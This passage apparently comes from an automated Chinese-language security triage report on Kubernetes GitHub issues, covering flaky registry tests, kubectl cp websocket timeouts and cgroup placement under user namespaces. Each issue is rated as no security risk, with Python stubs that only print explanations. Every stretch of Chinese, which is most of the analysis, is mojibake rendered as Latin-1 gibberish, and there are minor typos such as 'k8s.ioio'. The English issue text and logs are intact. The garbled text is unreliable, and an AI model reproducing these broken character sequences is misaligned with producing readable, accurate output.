# 3. åœ¨èŠ‚ç‚¹ä¸Šæ£€æŸ¥ /sys/fs/cgroup/ ä¸‹çš„ cgroup ç»“æ„ï¼Œå¯¹æ¯” containerd å’Œ CRI-O çš„å·®å¼‚ã€‚
#
# ä»¥ä¸‹ä¼ªä»£ç æ¼”ç¤ºäº†æ£€æŸ¥æ€è·¯ï¼ˆéå®é™…å¯è¿è¡Œè„šæœ¬ï¼‰ï¼š
#
# import os
# import re
#
# def check_cgroup_structure(runtime_type):
#     """
#     æ£€æŸ¥ç‰¹å®šè¿è¡Œæ—¶ä¸‹çš„ cgroup ç»“æ„ (ä¼ªä»£ç )
#     """
#     cgroup_base = "/sys/fs/cgroup"
#     pod_cgroup_pattern = re.compile(r"kubepods-besteffort-pod[0-9a-f\-]+")
#     containerd_userns_pattern = re.compile(r"slice:cri-containerd:[0-9a-f]+")
#     containerd_nouserns_pattern = re.compile(r"cri-containerd-[0-9a-f]+\.scope")
#     crio_pattern = re.compile(r"crio-[0-9a-f]+\.scope")
#
#     print(f"Checking cgroup structure for {runtime_type}...")
#
#     kubepods_path = os.path.join(cgroup_base, "kubepods.slice", "kubepods-besteffort.slice")
#     system_slice_path = os.path.join(cgroup_base, "system.slice")
#
#     # å®é™…æ£€æŸ¥é€»è¾‘ä¼šæ›´å¤æ‚ï¼Œéœ€è¦æ‰¾åˆ°å…·ä½“çš„ Pod å’Œ Container cgroup
#     # è¿™é‡Œä»…ç¤ºæ„æ€§åœ°åˆ—å‡ºè·¯å¾„
#
#     if runtime_type == "containerd_with_userns":
#         print(f"Expected Pod Sandbox Cgroup under: {kubepods_path}/<pod_slice>/cri-containerd-<sandbox_id>.scope")
#         print(f"Expected Container Cgroup under: {system_slice_path}/<pod_slice>:<container_id>") # <-- Inconsistent location
#         # å®é™…æ£€æŸ¥éœ€è¦éå† system.slice æŸ¥æ‰¾åŒ¹é… containerd_userns_pattern çš„é¡¹
#
#     elif runtime_type == "containerd_without_userns":
#         print(f"Expected Pod Sandbox Cgroup under: {kubepods_path}/<pod_slice>/cri-containerd-<sandbox_id>.scope")
#         print(f"Expected Container Cgroup under: {kubepods_path}/<pod_slice>/cri-containerd-<container_id>.scope") # <-- Consistent location
#
#     elif runtime_type == "crio":
#         print(f"Expected Pod Sandbox Cgroup under: {kubepods_path}/<pod_slice>/crio-<sandbox_id>")
#         print(f"Expected Container Cgroup under: {kubepods_path}/<pod_slice>/crio-<container_id>.scope") # <-- Consistent location
#
# # è¿è¡Œæ£€æŸ¥ (éœ€è¦æ ¹æ®å®é™…ç¯å¢ƒè°ƒæ•´)
# # check_cgroup_structure("containerd_with_userns")
# # check_cgroup_structure("containerd_without_userns")
# # check_cgroup_structure("crio")

print("è¯¥ Issue æè¿°äº†ä¸€ä¸ªåŠŸèƒ½æ€§ä¸ä¸€è‡´é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ï¼Œæ— éœ€æä¾› POC è„šæœ¬ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æŒ‡å‡ºçš„æ ¸å¿ƒé—®é¢˜æ˜¯ `containerd` åœ¨å¯ç”¨ç”¨æˆ·å‘½åç©ºé—´æ—¶ï¼Œå…¶åˆ›å»ºçš„å®¹å™¨ cgroup çš„å­˜æ”¾ä½ç½®å’Œå‘½åæ–¹å¼ä¸ä¸å¯ç”¨ç”¨æˆ·å‘½åç©ºé—´æ—¶ã€ä»¥åŠä¸ `CRI-O` çš„è¡Œä¸ºä¸ä¸€è‡´ã€‚è¿™è¿åäº†ä¸€è‡´æ€§å’Œå¯é¢„æµ‹æ€§åŸåˆ™ï¼Œå¯èƒ½å½±å“ä¾èµ– cgroup è·¯å¾„çš„ç³»ç»Ÿç®¡ç†æˆ–ç›‘æ§å·¥å…·ã€‚

ç„¶è€Œï¼Œè¿™ç§ä¸ä¸€è‡´æ€§æœ¬èº«å¹¶ä¸æ„æˆä¸€ä¸ªå¯ä»¥ç›´æ¥åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚Issue ä¸­æ²¡æœ‰æä¾›è¯æ®æˆ–åœºæ™¯è¯´æ˜è¿™ç§ä¸ä¸€è‡´æ€§ä¼šå¯¼è‡´æƒé™æå‡ã€å®¹å™¨é€ƒé€¸ã€ä¿¡æ¯æ³„éœ²æˆ–å¯åˆ©ç”¨çš„æ‹’ç»æœåŠ¡ã€‚å®ƒæ˜¯ä¸€ä¸ªåŠŸèƒ½å±‚é¢çš„ Bug æˆ–è®¾è®¡ä¸ä¸€è‡´ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜éå®‰å…¨é—®é¢˜ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚
2.  ç”±äºé£é™©è¯„çº§ä¸æ˜¯â€œé«˜é£é™©â€ï¼Œå› æ­¤ä¸éœ€è¦æä¾›ç”¨äºå¤ç°å®‰å…¨é£é™©çš„ Python POC è„šæœ¬ã€‚

æä¾›çš„ Python ä»£ç å—ä¸­åŒ…å«æ³¨é‡Šï¼Œè§£é‡Šäº†ä¸ºä½•ä¸æä¾› POCï¼Œå¹¶ç»™å‡ºäº†éªŒè¯ Issue æ‰€è¿°è¡Œä¸ºçš„æ€è·¯ï¼ˆæ£€æŸ¥ `/sys/fs/cgroup` ç›®å½•ç»“æ„ï¼‰ï¼Œä½†å¹¶æœªå®ç°ä¸€ä¸ªå¯æ‰§è¡Œçš„ POC è„šæœ¬ï¼Œå› ä¸ºä¸å­˜åœ¨éœ€è¦å¤ç°çš„å®‰å…¨é£é™©ã€‚è„šæœ¬æœ€åæ‰“å°ä¸€æ¡ä¿¡æ¯è¯´æ˜æƒ…å†µã€‚

---


## Issue #130975 k8s.io/apiserver/pkg/registry/generic/testing: store objects with defaults applied

- Issue é“¾æ¥ï¼š[#130975](https://github.com/kubernetes/kubernetes/issues/130975)

### Issue å†…å®¹

#### What happened?

When adding DeviceTaintRule with defaulting that sets a "TimeAdded" to the current time, the pkg/registry/resource/devicetaintrule/storage using the helpers from k8s.io/apiserver/pkg/registry/generic/testing randomly failed.

Debugging showed that defaulting was called multiple times when reading an object while reading an object from storage without that default. Depending on *when* the read happened, the returned object was different when crossing from one second into the next.

https://github.com/kubernetes/kubernetes/pull/130970#discussion_r2007258939

#### What did you expect to happen?

Defaulting should be applied before storing an object, like it normally is.

/cc @wojtek-t 
/sig api-machinery


#### How can we reproduce it (as minimally and precisely as possible)?

* Revert https://github.com/kubernetes/kubernetes/pull/130970.
* `go test -c ./pkg/registry/resource/devicetaintrule/storage && stress ./storage.test`


#### Anything else we need to know?

_No response_

#### Kubernetes version

1.33

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools




#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ Kubernetes API æœåŠ¡å™¨çš„é€šç”¨æ³¨å†Œè¡¨æµ‹è¯•åŒ… (`k8s.ioio/apiserver/pkg/registry/generic/testing`) ä¸­å‘ç°çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“ä½¿ç”¨å¸¦æœ‰é»˜è®¤å€¼ï¼ˆä¾‹å¦‚å°† `TimeAdded` å­—æ®µè®¾ç½®ä¸ºå½“å‰æ—¶é—´ï¼‰çš„ `DeviceTaintRule` èµ„æºæ—¶ï¼Œæµ‹è¯•ä¼šéšæœºå¤±è´¥ã€‚åŸå› æ˜¯é»˜è®¤å€¼è®¾ç½®é€»è¾‘ (defaulting) åœ¨ä»å­˜å‚¨ä¸­è¯»å–ä¸€ä¸ª*æœª*åº”ç”¨è¯¥é»˜è®¤å€¼çš„å¯¹è±¡æ—¶è¢«å¤šæ¬¡è°ƒç”¨ã€‚å¦‚æœè¯»å–æ“ä½œæ°å¥½å‘ç”Ÿåœ¨ç§’æ•°è·¨è¶Šçš„æ—¶åˆ»ï¼Œç”±äº `TimeAdded` é»˜è®¤å€¼ä¸ºå½“å‰æ—¶é—´ï¼Œå¤šæ¬¡è°ƒç”¨ defaulting ä¼šå¯¼è‡´è¿”å›çš„å¯¹è±¡çŠ¶æ€ä¸ä¸€è‡´ï¼Œä»è€Œå¼•å‘æµ‹è¯•å¤±è´¥ã€‚

æ ¹æ® Issue å†…å®¹åˆ†æï¼š
1.  **é—®é¢˜é¢†åŸŸ**ï¼šè¯¥é—®é¢˜å‘ç”Ÿåœ¨ `generic/testing` åŒ…ä¸­ï¼Œè¿™æ˜¯ç”¨äº**æµ‹è¯•** API èµ„æºå­˜å‚¨é€»è¾‘çš„è¾…åŠ©å·¥å…·ï¼Œè€Œä¸æ˜¯ç”Ÿäº§ç¯å¢ƒ API æœåŠ¡å™¨çš„æ ¸å¿ƒè¿è¡Œæ—¶é€»è¾‘æœ¬èº«ã€‚
2.  **é—®é¢˜æ€§è´¨**ï¼šè¿™æ˜¯ä¸€ä¸ª**åŠŸèƒ½æ€§ç¼ºé™·æˆ–ä¸ä¸€è‡´æ€§ (functional bug/inconsistency)**ï¼Œå¯¼è‡´æµ‹è¯•ç»“æœä¸ç¨³å®š (flaky tests)ã€‚å®ƒå½±å“çš„æ˜¯ä½¿ç”¨è¿™äº›æµ‹è¯•è¾…åŠ©å·¥å…·è¿›è¡Œå¼€å‘çš„å¼€å‘è€…ï¼Œè€Œä¸æ˜¯è¿è¡Œ Kubernetes é›†ç¾¤çš„ç”¨æˆ·æˆ–ç®¡ç†å‘˜ã€‚
3.  **å½±å“èŒƒå›´**ï¼šå½±å“ä¸»è¦å±€é™äº**æµ‹è¯•ç¯å¢ƒ**çš„å¯é æ€§ã€‚å®ƒä¸ç›´æ¥æš´éœ²ç”Ÿäº§ç¯å¢ƒä¸­çš„å®‰å…¨æ¼æ´ï¼Œä¾‹å¦‚è¿œç¨‹ä»£ç æ‰§è¡Œã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²æˆ–æ‹’ç»æœåŠ¡ã€‚è™½ç„¶ä»£ç çš„æ­£ç¡®æ€§å¾ˆé‡è¦ï¼Œä½†æ­¤ç‰¹å®šé—®é¢˜å¹¶æœªæè¿°ä¸€ä¸ªå¯è¢«å¤–éƒ¨æ”»å‡»è€…åˆ©ç”¨æ¥å±å®³é›†ç¾¤å®‰å…¨çš„é€”å¾„ã€‚
4.  **å¤ç°æ–¹å¼**ï¼šå¤ç°æ­¥éª¤æ¶‰åŠå›æ»šä¸€ä¸ª PR å¹¶è¿è¡Œ Go æµ‹è¯• (`go test ... && stress ...`)ï¼Œè¿™è¿›ä¸€æ­¥è¯å®äº†é—®é¢˜å‘ç”Ÿåœ¨å¼€å‘å’Œæµ‹è¯•é˜¶æ®µã€‚
5.  **ä¸å®‰å…¨é£é™©æ ‡å‡†çš„æ¯”å¯¹**ï¼š
    *   æ ‡å‡† 2ï¼šè¯¥é—®é¢˜æ˜¯æµ‹è¯•ä»£ç çš„æ­£ç¡®æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨é—®é¢˜ã€‚
    *   æ ‡å‡† 4ï¼šéæäº¤è€…é—®é¢˜ã€‚
    *   æ ‡å‡† 5, 6, 7, 8ï¼šä¸æ¶‰åŠ DoSã€å‡­è¯æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œã€ææƒã€å¤šç”¨æˆ·å½±å“ç­‰é«˜é£é™©åœºæ™¯ã€‚

ç»“è®ºï¼šè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªæµ‹è¯•æ¡†æ¶ä¸­çš„åŠŸèƒ½æ€§ç¼ºé™·ï¼Œå¯¼è‡´æµ‹è¯•ä¸ç¨³å®šï¼Œä¸æ„æˆå¯¹ Kubernetes è¿è¡Œç¯å¢ƒçš„å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue æè¿°çš„é—®é¢˜æ˜¯ Kubernetes å†…éƒ¨æµ‹è¯•æ¡†æ¶ (k8s.io/apiserver/pkg/registry/generic/testing) çš„ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ï¼Œ
# å¯¼è‡´åœ¨ä½¿ç”¨ç‰¹å®šèµ„æºå’Œé»˜è®¤å€¼æ—¶æµ‹è¯•ä¸ç¨³å®šã€‚
# å®ƒå¹¶éä¸€ä¸ªå¯ä»¥åœ¨è¿è¡Œä¸­çš„ Kubernetes é›†ç¾¤ä¸Šè¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚
# å¤ç°è¯¥é—®é¢˜éœ€è¦ï¼š
# 1. è·å– Kubernetes æºç ã€‚
# 2. å›æ»šæŒ‡å®šçš„ Pull Request (https://github.com/kubernetes/kubernetes/pull/130970)ã€‚
# 3. åœ¨æºç ç¯å¢ƒä¸­è¿è¡Œ Go è¯­è¨€çš„æµ‹è¯•å‘½ä»¤ (`go test -c ./pkg/registry/resource/devicetaintrule/storage && stress ./storage.test`)ã€‚
#
# è¿™ç§ç±»å‹çš„å¤ç°æ— æ³•é€šè¿‡ç®€å•çš„ Python è„šæœ¬ä¸ Kubernetes API äº¤äº’æ¥æ¨¡æ‹Ÿã€‚
# å®ƒéœ€è¦åœ¨ Kubernetes çš„å¼€å‘ç¯å¢ƒä¸­ï¼Œé’ˆå¯¹ç‰¹å®šçš„ Go ä»£ç åŒ…è¿è¡Œå•å…ƒæµ‹è¯•æˆ–é›†æˆæµ‹è¯•ã€‚
#
# å› æ­¤ï¼Œæ— æ³•æä¾›ä¸€ä¸ªæœ‰æ„ä¹‰çš„ã€èƒ½åœ¨çœŸå®ç¯å¢ƒä¸­å¤ç°æ­¤ç‰¹å®šæµ‹è¯•æ¡†æ¶ç¼ºé™·çš„ Python POC è„šæœ¬ã€‚
# è¯¥é—®é¢˜ä¸å±äºå¯ä»¥é€šè¿‡å¤–éƒ¨äº¤äº’è§¦å‘çš„å®‰å…¨é£é™©ã€‚

print("è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ä¸€ä¸ªå½±å“ Kubernetes å†…éƒ¨æµ‹è¯•ç¨³å®šæ€§çš„åŠŸèƒ½ç¼ºé™·ï¼Œ")
print("å¹¶éä¸€ä¸ªå¯é€šè¿‡ Python è„šæœ¬ä¸è¿è¡Œä¸­é›†ç¾¤äº¤äº’æ¥å¤ç°çš„å®‰å…¨æ¼æ´ã€‚")
print("å¤ç°éœ€è¦åœ¨ Kubernetes å¼€å‘ç¯å¢ƒä¸­æ‰§è¡Œç‰¹å®šçš„ Go æµ‹è¯•ã€‚")
print("å› æ­¤ï¼Œä¸æä¾›å¤ç°è„šæœ¬ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿° Python è„šæœ¬å¹¶æœªå®é™…æ‰§è¡Œå¤ç°æ“ä½œã€‚åŸå› å¦‚ä¸‹ï¼š

1.  **é—®é¢˜æ€§è´¨é™åˆ¶**ï¼šè¯¥ Issue æè¿°çš„æ˜¯ Kubernetes å†…éƒ¨ Go è¯­è¨€æµ‹è¯•ä»£ç  (`pkg/registry/generic/testing`) çš„ä¸€ä¸ªç¼ºé™·ï¼Œå®ƒå¯¼è‡´äº† Go å•å…ƒ/é›†æˆæµ‹è¯•çš„ä¸ç¨³å®šã€‚è¿™ä¸æ˜¯ä¸€ä¸ªå¯ä»¥é€šè¿‡ä¸ Kubernetes API äº¤äº’ï¼ˆä¾‹å¦‚ä½¿ç”¨ `kubernetes` Python åº“ï¼‰æ¥è§¦å‘æˆ–åˆ©ç”¨çš„è¿è¡Œæ—¶æ¼æ´ã€‚
2.  **å¤ç°ç¯å¢ƒè¦æ±‚**ï¼šæ ¹æ® Issue ä¸­æä¾›çš„å¤ç°æ­¥éª¤ï¼Œéœ€è¦è®¿é—® Kubernetes çš„æºä»£ç ï¼Œå›æ»šç‰¹å®šçš„ä»£ç æ›´æ”¹ï¼Œå¹¶ä½¿ç”¨ Go å·¥å…·é“¾æ¥ç¼–è¯‘å’Œæ‰§è¡Œç‰¹å®šçš„æµ‹è¯•ã€‚è¿™è¶…å‡ºäº† Python è„šæœ¬ä¸è¿è¡Œä¸­é›†ç¾¤äº¤äº’çš„èŒƒç•´ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼šå¦‚åˆ†ææ‰€è¿°ï¼Œè¯¥é—®é¢˜è¢«è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ï¼Œå› ä¸ºå®ƒå½±å“çš„æ˜¯å¼€å‘æµ‹è¯•æµç¨‹çš„å¯é æ€§ï¼Œè€Œéé›†ç¾¤çš„å®‰å…¨æ€§ã€‚æ ¹æ®è¦æ±‚ï¼Œä»…é’ˆå¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°è„šæœ¬ã€‚

å› æ­¤ï¼Œè„šæœ¬ä»…æ‰“å°è¯´æ˜ä¿¡æ¯ï¼Œè§£é‡Šäº†ä¸ºä»€ä¹ˆæ— æ³•ä¸ºæ­¤ Issue æä¾›ä¸€ä¸ªæœ‰å®é™…æ„ä¹‰çš„ Python å¤ç° POCã€‚

---


## Issue #130972 Issue with kubectl on v1.32 when trying to copy files to pod

- Issue é“¾æ¥ï¼š[#130972](https://github.com/kubernetes/kubernetes/issues/130972)

### Issue å†…å®¹

#### What happened?

To be honest, this one is a little difficult to recreate, but we are running a gitlab runner on eks in one cluster and attempting to copy files to a pod in another cluster. With the v1.28 kubectl client, we have had no issue, but every now and again with the 1.32.2 (and after reading about this issue https://github.com/kubernetes/kubernetes/pull/130253 we also tried 1.32.3) the connection will randomly drop.

Turning on verbosity up to 9

```
I0321 08:36:56.416328    2298 round_trippers.go:577] HTTP Statistics: DNSLookup 0 ms Dial 1 ms TLSHandshake 4 ms ServerProcessing 22 ms Duration 29 ms
I0321 08:36:56.416341    2298 round_trippers.go:584] Response Headers:
I0321 08:36:56.416352    2298 round_trippers.go:587]     Upgrade: websocket
I0321 08:36:56.416360    2298 round_trippers.go:587]     Connection: Upgrade
I0321 08:36:56.416366    2298 round_trippers.go:587]     Sec-Websocket-Accept: d3elUzkdg3chrxOaBB2wRlGoYJ4=
I0321 08:36:56.416370    2298 round_trippers.go:587]     Sec-Websocket-Protocol: v5.channel.k8s.io
I0321 08:36:56.416381    2298 websocket.go:133] The subprotocol is v5.channel.k8s.io
I0321 08:37:01.416862    2298 websocket.go:497] Websocket Ping succeeeded
I0321 08:37:01.417365    2298 websocket.go:455] Pong message received ()--resetting read deadline
error: context deadline exceeded
```

but a working version 

```

I0321 08:36:54.696359    4031 round_trippers.go:584] Response Headers:
I0321 08:36:54.696365    4031 round_trippers.go:587]     Upgrade: websocket
I0321 08:36:54.696368    4031 round_trippers.go:587]     Connection: Upgrade
I0321 08:36:54.696371    4031 round_trippers.go:587]     Sec-Websocket-Accept: qrNgxMvN9dCz3AeqMEMz+OjDm3E=
I0321 08:36:54.696374    4031 round_trippers.go:587]     Sec-Websocket-Protocol: v5.channel.k8s.io
I0321 08:36:54.696378    4031 websocket.go:133] The subprotocol is v5.channel.k8s.io
I0321 08:36:54.696489    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696536    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696568    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696602    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696624    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696651    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696669    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696701    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696717    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696739    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696747    4031 websocket.go:395] Close() on stream 0
I0321 08:36:54.696762    4031 websocket.go:405] Close() done on stream 0
I0321 08:36:54.776199    4031 websocket.go:490] closed channel--returning
```
The apiserver is on v1.32.2

No issues using v1.28 client, i suspect it has something to do with the new exec protocol? What's strange is we don't see that Ping message on a working version


#### What did you expect to happen?

I expect the cp command to copy without issue

#### How can we reproduce it (as minimally and precisely as possible)?

The files we're copying aren't large- small text files, and i haven't been able to reproduce it locally. The best i can do is to try and be in a pod in one eks cluster, talking to another eks cluster and kubectl cp to that cluster

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.32.3
Server Version: v1.32.2-eks-bc803b4
```

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
vpc-cni
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæ ¸å¿ƒé—®é¢˜**ï¼šç”¨æˆ·åœ¨ä½¿ç”¨ `kubectl` v1.32.x ç‰ˆæœ¬ï¼ˆå…·ä½“æåˆ° 1.32.2 å’Œ 1.32.3ï¼‰ä»ä¸€ä¸ª EKS é›†ç¾¤ä¸­çš„ Gitlab Runner Pod å‘å¦ä¸€ä¸ª EKS é›†ç¾¤ä¸­çš„ Pod å¤åˆ¶æ–‡ä»¶æ—¶ï¼Œ`kubectl cp` å‘½ä»¤ä¼šéšæœºå¤±è´¥ï¼Œå¹¶æŠ¥ "context deadline exceeded" é”™è¯¯ã€‚è€Œä½¿ç”¨ `kubectl` v1.28 ç‰ˆæœ¬åˆ™æ²¡æœ‰æ­¤é—®é¢˜ã€‚
2.  **æ—¥å¿—åˆ†æ**ï¼š
    *   å¤±è´¥çš„æ—¥å¿—ï¼ˆv1.32ï¼‰æ˜¾ç¤ºäº† Websocket è¿æ¥å»ºç«‹æˆåŠŸ (`Sec-Websocket-Protocol: v5.channel.k8s.io`)ï¼Œä¹‹åæœ‰ `Websocket Ping succeeeded` å’Œ `Pong message received`ï¼Œç„¶åæ‰è¶…æ—¶ã€‚
    *   æˆåŠŸçš„æ—¥å¿—ï¼ˆv1.28ï¼Œä½†æ—¥å¿—ç‰‡æ®µå¯èƒ½ä¸å®Œæ•´ï¼‰æ˜¾ç¤ºäº† Websocket è¿æ¥å»ºç«‹ï¼Œç„¶åæ˜¯å¤šæ¬¡ `Write()` å’Œ `Close()` æ“ä½œï¼Œæ²¡æœ‰æ˜¾ç¤º Ping/Pong æ¶ˆæ¯ï¼ˆå¯èƒ½æœªå‘ç”Ÿæˆ–æœªæˆªå–åˆ°ï¼‰ã€‚
    *   ç”¨æˆ·æ€€ç–‘ä¸ v1.32 å¼•å…¥çš„æ–° exec åè®®ï¼ˆæˆ–å…¶å®ç°ï¼‰æœ‰å…³ã€‚
3.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜è¡¨ç°ä¸º `kubectl cp` åŠŸèƒ½åœ¨ç‰¹å®šç‰ˆæœ¬å’Œç‰¹å®šï¼ˆè·¨é›†ç¾¤ï¼‰åœºæ™¯ä¸‹çš„ä¸ç¨³å®šæ€§ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œè¶…æ—¶å¤±è´¥ã€‚è¿™çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bug æˆ–å…¼å®¹æ€§é—®é¢˜ï¼Œè€Œä¸æ˜¯å…¸å‹çš„å®‰å…¨æ¼æ´ã€‚å‘½ä»¤æ‰§è¡Œçš„å‰ææ˜¯ç”¨æˆ·æ‹¥æœ‰åˆæ³•çš„ `kubectl cp` æƒé™ï¼ˆé€šå¸¸éœ€è¦ Pod çš„ exec æƒé™ï¼‰ã€‚
4.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   **ä¿å¯†æ€§ (Confidentiality)**ï¼šIssue ä¸­æ²¡æœ‰æè¿°æ•°æ®æ³„éœ²ã€‚ç”¨æˆ·æä¾›çš„æ—¥å¿—ä¸­ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºæ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å‡­è¯ã€ç§å¯†æ•°æ®ç­‰ï¼‰ï¼Œåªæœ‰æ ‡å‡†çš„ Websocket åè®®äº¤äº’ä¿¡æ¯ã€‚
    *   **å®Œæ•´æ€§ (Integrity)**ï¼šå‘½ä»¤å¤±è´¥æ„å‘³ç€æ— æ³•å®Œæˆæ–‡ä»¶å¤åˆ¶ï¼Œå½±å“äº†æ“ä½œçš„å®Œæ•´æ€§ï¼Œä½†è¿™å±äºåŠŸèƒ½æ€§é—®é¢˜ï¼Œè€Œéæ•°æ®è¢«ç¯¡æ”¹ã€‚
    *   **å¯ç”¨æ€§ (Availability)**ï¼šå¯¹äºéœ€è¦æ‰§è¡Œ `kubectl cp` çš„ç”¨æˆ·æ¥è¯´ï¼Œæ­¤ Bug å¯¼è‡´è¯¥åŠŸèƒ½é—´æ­‡æ€§ä¸å¯ç”¨ã€‚è¿™å¯ä»¥è¢«è§†ä¸ºä¸€ç§ç‰¹å®šåŠŸèƒ½çš„æ‹’ç»æœåŠ¡ (DoS)ã€‚ä½†æ˜¯ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 5 æ¡ï¼Œè¿™ç§ DoS æ˜¯é’ˆå¯¹æ‰§è¡Œæ“ä½œçš„ç”¨æˆ·è‡ªèº«çš„ï¼Œä¸”éœ€è¦ç”¨æˆ·å…·å¤‡æ‰§è¡Œ `kubectl cp` çš„æƒé™ï¼ˆéåªè¯»æƒé™ï¼‰ã€‚å®ƒä¸æ˜¯ä¸€ä¸ªæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¥å½±å“å…¶ä»–ç”¨æˆ·æˆ–æ•´ä¸ªæœåŠ¡çš„æ¼æ´ã€‚æ”»å‡»è€…æ— æ³•é€šè¿‡è§¦å‘è¿™ä¸ª Bug æ¥é˜»æ­¢ *å…¶ä»–* åˆæ³•ç”¨æˆ·ä½¿ç”¨ `kubectl cp` æˆ–å…¶ä»–æœåŠ¡ã€‚
    *   **æƒé™æå‡/å‘½ä»¤æ‰§è¡Œ/å®¹å™¨é€ƒé€¸**ï¼šIssue å®Œå…¨æ²¡æœ‰æ¶‰åŠè¿™äº›é«˜é£é™©åœºæ™¯ã€‚`kubectl cp` æœ¬èº«å°±æ˜¯åœ¨æˆæƒèŒƒå›´å†…æ‰§è¡Œçš„æ“ä½œï¼Œå…¶å¤±è´¥å¹¶æœªå¯¼è‡´æƒé™æå‡æˆ–éé¢„æœŸçš„ä»£ç æ‰§è¡Œã€‚
    *   **å¤šç”¨æˆ·å½±å“**ï¼šå¦‚ä¸Šæ‰€è¿°ï¼Œæ­¤é—®é¢˜å½±å“çš„æ˜¯æ‰§è¡Œå‘½ä»¤çš„ç”¨æˆ·æœ¬èº«ï¼Œä¸ä¼šå› ä¸ºä¸€ä¸ªç”¨æˆ·è§¦å‘æ­¤ Bug è€Œå½±å“åˆ°å…¶ä»–ç”¨æˆ·ï¼ˆé™¤éåº•å±‚ API Server èµ„æºè¢«å¼‚å¸¸æ¶ˆè€—ï¼Œä½† Issue å¹¶æœªæä¾›è¿™æ–¹é¢è¯æ®ï¼Œä¸”é”™è¯¯å‘ç”Ÿåœ¨å®¢æˆ·ç«¯è¶…æ—¶ï¼‰ã€‚
    *   **æ•æ„Ÿä¿¡æ¯æš´éœ²**ï¼šIssue æäº¤è€…æä¾›çš„æ—¥å¿—ä¸åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚ç¬¦åˆé£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 4 æ¡ï¼Œå³ä½¿åŒ…å«ï¼Œä¹Ÿåº”è§†ä¸ºæäº¤è€…çš„é—®é¢˜ã€‚

5.  **ç»“è®º**ï¼šè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œå¯¼è‡´ `kubectl cp` åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¤±è´¥ã€‚è™½ç„¶å½±å“äº†å¯ç”¨æ€§ï¼Œä½†å®ƒéœ€è¦æ‰§è¡Œè€…æ‹¥æœ‰ç›¸åº”æƒé™ï¼Œå¹¶ä¸”å½±å“èŒƒå›´é™äºæ‰§è¡Œè€…è‡ªèº«çš„æ“ä½œï¼Œä¸ç¬¦åˆé«˜é£é™©æˆ–ä½é£é™©å®‰å…¨æ¼æ´çš„å®šä¹‰ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# Not applicable, as the issue is rated "ä¸æ¶‰åŠ" (Not Involved) security risk.
# è¯¥é—®é¢˜è¢«è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ï¼Œå› æ­¤ä¸éœ€è¦æä¾›å¤ç°è„šæœ¬ã€‚
# é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bug æˆ–å…¼å®¹æ€§é—®é¢˜ï¼Œå…¶å¤ç°ä¾èµ–äºç‰¹å®šçš„ç¯å¢ƒï¼ˆè·¨ EKS é›†ç¾¤ç½‘ç»œã€ç‰¹å®šç‰ˆæœ¬çš„ kubectl å’Œ K8s API Serverï¼‰ï¼Œ
